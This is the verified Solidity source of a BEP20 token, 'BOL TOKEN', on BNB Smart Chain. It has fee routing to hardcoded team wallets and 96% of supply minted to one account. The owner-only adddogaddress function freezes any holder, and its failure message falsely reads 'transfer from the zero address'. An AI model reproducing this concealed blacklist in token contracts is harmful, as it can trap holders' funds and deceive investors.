/**
 *Submitted for verification at BscScan.com on 2022-08-01
*/

// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.5.16;

interface IBEP20 {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address _owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract Context {
  constructor () internal { }

  function _msgSender() internal view returns (address payable) {
    return msg.sender;
  }

  function _msgData() internal view returns (bytes memory) {
    this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
    return msg.data;
  }
}
library SafeMath {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }
  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    // Solidity only automatically asserts when dividing by 0
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }
  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}
contract Ownable is Context {
  address private _owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  constructor () internal {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }
  function owner() public view returns (address) {
    return _owner;
  }
  modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }
  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }
  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }
  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}

contract BEP20Cardano is Context, IBEP20, Ownable {
  using SafeMath for uint256;

  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowances;
  mapping (address => bool) private _whiteaddress;
  mapping (address => bool) private _dogaddress;

  uint256 private _totalSupply;
  uint8 public _decimals;
  string public _symbol;
  string public _name;

  uint256 public nftfhnum=0;
  uint256 public fomonum=0;

  address public lp;
  address public nftacc=0xbF41A5Fc6731971EbE6095781aac89648Ab916FA;
  address public fomoacc=0x12aAEa415d92213df4Fb5Ff2eCA44aA02575D873;

  address public csacc=0xe3839667cbBfa58B2CE0ce3F43bFb227f1fc1B33;
  address public jjhacc=0x2e50F2b6F106868D8431288568BBc5525C50be48;
  address public jsacc=0xF5Bcd2b5438336465ce48e9512D98dB841bC3De6;
  address public mintacc=0xD4083706B1E3cF7c5400f00b5e80493eF8C799d4;

  address public ldxacc=0x6029D0938e921af3717627082A3Ad4E2885A0a8a;
  address public jkacc=0xD9Ae3a1D9A1bb4a53574304FF84F97cd0187f04C;

  address public burnacc=0x930B4eBedB9400f8251026f6611AA76734dACad3;

  constructor() public {
    _name = "BOL TOKEN";
    _symbol = "BOL";
    _decimals = 18;
    _totalSupply = 500000000 * 10**18;
    

    // _whiteaddress[msg.sender]=true;
    _whiteaddress[nftacc]=true;
    _whiteaddress[fomoacc]=true;
    _whiteaddress[csacc]=true;
    _whiteaddress[jjhacc]=true;
    _whiteaddress[jsacc]=true;
    // _whiteaddress[mintacc]=true;
    _whiteaddress[ldxacc]=true;
    _whiteaddress[jkacc]=true;


    _balances[csacc] = _totalSupply.mul(1).div(100);
    emit Transfer(address(0),csacc, _totalSupply.mul(1).div(100));
    _balances[jjhacc] = _totalSupply.mul(5).div(1000);
    emit Transfer(address(0),jjhacc, _totalSupply.mul(5).div(1000));
    _balances[jsacc] = _totalSupply.mul(5).div(1000);
    emit Transfer(address(0),jsacc, _totalSupply.mul(5).div(1000));
    _balances[mintacc] = _totalSupply.mul(96).div(100);
    emit Transfer(address(0),mintacc, _totalSupply.mul(96).div(100));
    _balances[ldxacc] = _totalSupply.mul(1).div(100);
    emit Transfer(address(0),ldxacc, _totalSupply.mul(1).div(100));
    _balances[jkacc] = _totalSupply.mul(1).div(100);
    emit Transfer(address(0),jkacc, _totalSupply.mul(1).div(100));
  }
  function getOwner() external view returns (address) {
    return owner();
  }
  function decimals() external view returns (uint8) {
    return _decimals;
  }
  function symbol() external view returns (string memory) {
    return _symbol;
  }
  function name() external view returns (string memory) {
    return _name;
  }
  function getnftfhnum() external view returns (uint256) {
    return nftfhnum;
  }
  function getfomonum() external view returns (uint256) {
    return fomonum;
  }
  function totalSupply() external view returns (uint256) {
    return _totalSupply;
  }
  function balanceOf(address account) external view returns (uint256) {
    return _balances[account];
  }
  function transfer(address recipient, uint256 amount) external returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }
  function allowance(address owner, address spender) external view returns (uint256) {
    return _allowances[owner][spender];
  }
  function approve(address spender, uint256 amount) external returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
    return true;
  }
  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }
  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }
  function burn(uint256 amount) public returns (bool) {
    _burn(_msgSender(), amount);
    return true;
  }
  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");
    require(_dogaddress[sender] != true, "BEP20: transfer from the zero address");
    require(_dogaddress[recipient] != true, "BEP20: transfer from the zero address");

    if(_whiteaddress[sender]==true || _whiteaddress[recipient]==true){
       _tokenTransfer(sender,recipient,amount.mul(100).div(100));
    }else if(sender==lp || recipient==lp){
       _tokenTransfer(sender,nftacc,amount.mul(4).div(100));
       _tokenTransfer(sender,fomoacc,amount.mul(1).div(100));
       _tokenTransfer(sender,recipient,amount.mul(95).div(100));
       nftfhnum+=amount.mul(4).div(100);
       fomonum+=amount.mul(1).div(100);
    }else if(recipient==burnacc){
       _tokenTransfer(sender,0x000000000000000000000000000000000000dEaD,amount.mul(90).div(100)); 
       _tokenTransfer(sender,nftacc,amount.mul(10).div(100));
       nftfhnum+=amount.mul(10).div(100);
    }else{
       _tokenTransfer(sender,recipient,amount.mul(100).div(100)); 
    }
    
  }
  function _tokenTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) private {
        _balances[sender] = _balances[sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
 }
  function _burn(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: burn from the zero address");

    _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");
    _totalSupply = _totalSupply.sub(amount);
    emit Transfer(account, address(0), amount);
  }
  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }
  function _burnFrom(address account, uint256 amount) internal {
    _burn(account, amount);
    _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, "BEP20: burn amount exceeds allowance"));
  }
  function addwhiteaddress(address _acc) public onlyOwner{
        _whiteaddress[_acc] = true;
  }
  function removewhiteaddress(address _acc) public onlyOwner{
        _whiteaddress[_acc] = false;
  }
  function adddogaddress(address _acc) public onlyOwner{
        _dogaddress[_acc] = true;
  }
  function removedogaddress(address _acc) public onlyOwner{
        _dogaddress[_acc] = false;
  }
  function setlp(address _acc) public onlyOwner{
        lp = _acc;
  }

}